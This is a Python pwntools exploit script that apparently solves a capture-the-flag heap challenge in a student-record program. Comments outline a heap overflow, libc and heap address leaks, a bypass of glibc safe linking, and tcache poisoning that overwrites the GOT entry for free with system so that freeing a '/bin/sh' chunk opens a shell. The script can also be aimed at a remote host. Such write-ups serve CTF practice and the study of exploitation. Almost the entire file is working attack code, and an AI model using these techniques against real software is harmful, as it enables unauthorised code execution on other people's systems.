#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
After it free's the chunk it actually removes it from the linked list so we can't leverage a UAF

But there's a heap overflow in my_read so we can leverage that to get overlapping chunk

We control the size passed to malloc so we can just allocate a chunk larger than the size of tcachebin then free to place it in unsorted bin and reallocated to leak it

To prevent consolidation with top chunk we create a chunk to border the top chunk

To bypass safe linking we need to get a heap leak
"""


def init():
    global io

    io = start()


def add_student(size, name, age, score):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", name)
    io.sendlineafter(b":", str(age).encode())
    io.sendlineafter(b":", str(score).encode())
    
    
def show_student():
    io.sendlineafter(b">", b"2")


def delete_student(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())


def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def solve():

    """
    Libc leak
    """
    add_student(0x500, b"A"*8, 1337, 1)
    add_student(0x20, b"B"*8, 1337, 1)

    delete_student(0)
    add_student(0x500, b"C"*8, 7331, 2)
    show_student()

    io.recvuntil(b"C"*8)
    main_arena = u64(io.recv(6).ljust(8, b"\x00")) - 0x60
    libc.address = main_arena - libc.sym["main_arena"]
    info("libc base: %#x", libc.address)

    """
    Heap leak
    """

    add_student(0x20, b"heap", 5, 5)
    add_student(0x20, b"feng", 5, 5)
    add_student(0x20, b"shui", 5, 5)

    delete_student(3)
    delete_student(3)
    delete_student(2)

    add_student(0x20, b"A"*64, 5, 5)
    show_student()

    io.recvuntil(b"A"*64)
    heap_base = u64(io.recv(4).ljust(8, b"\x00")) - 0x8c0
    info("heap base: %#x", heap_base)

    """
    Overlapping chunk
    """

    add_student(0x50, b"chunkA", 1337, 1)
    add_student(0x50, b"chunkB", 1337, 1)
    add_student(0x50, b"chunkC", 1337, 1)
    add_student(0x50, b"chunkD", 1337, 1)
    add_student(0x50, b"chunkE", 1337, 1)

    delete_student(7)
    delete_student(6)
    delete_student(5)

    tcache_next = heap_base + 0xad0
    victim = exe.got["free"] - 8 # bypass tcache misaligned check
    padding = [b"Z"] * 88
    ptr = mangle(heap_base, victim)

    fake_chunk = flat(
        [   
            [*padding],
            p64(0x21),
            mangle(heap_base, tcache_next),
            p64(0) * 2,
            p64(0x61),
            p64(ptr)
        ]
    )

    rewrite = libc.address + 0x38d934
    system = libc.sym["system"]

    payload = p64(rewrite) + p64(system)

    add_student(0x50, fake_chunk, 1337, 1)
    add_student(0x50, b"/bin/sh\x00", 1, 1)
    add_student(0x50, payload, 2, 2)

    delete_student(6)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

